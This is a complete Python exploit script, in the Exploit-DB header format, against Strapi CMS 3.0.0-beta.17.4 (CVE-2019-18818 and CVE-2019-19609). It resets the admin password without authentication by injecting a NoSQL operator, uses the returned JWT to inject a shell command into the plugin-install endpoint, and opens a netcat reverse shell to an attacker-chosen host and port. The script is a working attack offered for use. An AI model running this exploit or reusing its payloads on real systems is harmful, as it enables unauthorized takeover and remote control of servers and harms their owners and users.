# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Unauthenticated Remote Code Execution
# Date: 2022-01-23
# Exploit Author: Cooper Beltrami
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: macOS 12.2 Beta
# CVE : CVE-2019-18818, CVE-2019-19609

#!/bin/python

import requests
import json
import sys

print("========================================================")
print("|    STRAPI REMOTE CODE EXECUTION (CVE-2019-19609)     |")
print("========================================================")

def check_version():
    global rhost

    print("[+] Checking Strapi CMS version")

    version = requests.get(f"{rhost}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]

    if version == "3.0.0-beta.17.4":
        print("[+] Looks like this exploit should work!")
        print("[+] Executing exploit\n")
    else:
        print("[-] Version mismatch")
        print("[-] Exiting now")
        sys.exit(1)

def password_reset():
    global rhost, jwt

    session = requests.session()
    params = {
        "code": {"$gt": 0},
        "password": "Password123",
        "passwordConfirmation": "Password123"
    }

    output = session.post(f"{rhost}/admin/auth/reset-password", json = params).text
    response = json.loads(output)

    jwt = response["jwt"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessful")
        print("[-] Exiting now")

        sys.exit(1)

def plugin_install():
    global rhost, lhost, lport, jwt

    headers = {
        "Host": rhost.replace('http://', '').replace('https://', ''),
        "Authorization": f"Bearer {jwt}",
        "Content-Type": "application/json",
        "Content-Length": "131",
        "Connection": "close"
    }

    data = '{ "plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 'f"{lhost} {lport}"' >/tmp/f)", "port":"80" }'
    requests.post(f"{rhost}/admin/plugins/install", headers=headers, data=data, verify=False)


if __name__ == ("__main__"):
    if len(sys.argv) != 4:
        print("[-] Incorrect number of arguments")
        print("[*] Usage: python3 exploit.py <RHOST> <LHOST> <LPORT>")

        sys.exit(1)
    else:
        global rhost, lhost, lport

        rhost = sys.argv[1]
        lhost = sys.argv[2]
        lport = sys.argv[3]

        if rhost.endswith("/"):
            rhost = rhost[:-1]

        check_version()
        password_reset()
        plugin_install()